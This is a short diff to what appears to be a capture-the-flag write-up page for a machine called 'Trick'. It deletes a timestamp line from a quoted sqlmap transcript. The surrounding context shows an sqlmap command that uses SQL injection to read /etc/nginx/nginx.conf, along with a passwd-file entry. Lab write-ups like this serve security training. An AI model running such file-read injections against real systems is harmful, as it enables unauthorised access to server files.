@@ -261,7 +261,6 @@ michael:x:1001:1001::/home/michael:/bin/bash
           text={`
 root@loe# sqlmap -r trick_burp_nginx_FILE.req --batch --dbms mysql --threads 10 --file-read=/etc/nginx/nginx.conf
 
-[*] starting @ 00:08:56 /2022-09-20/
 [00:08:56] [INFO] parsing HTTP request from 'trick_burp_nginx_FILE.req'
 [00:09:03] [WARNING] provided value for parameter 'id' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
 [00:09:03] [WARNING] provided value for parameter 'middlename' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
